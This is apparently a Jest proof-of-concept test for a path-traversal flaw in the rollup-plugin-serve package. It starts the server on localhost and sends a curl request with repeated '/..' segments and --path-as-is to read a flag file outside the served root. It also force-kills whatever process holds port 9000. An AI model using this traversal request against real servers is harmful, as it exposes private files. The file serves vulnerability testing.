const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in rollup-plugin-serve", (done) => {
  expect.assertions(1);
  const server = require("rollup-plugin-serve");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 9000/tcp", () => {});
  } catch (e) {}
  server({
    host: "localhost",
    port: 9000,
  });
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:9000${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
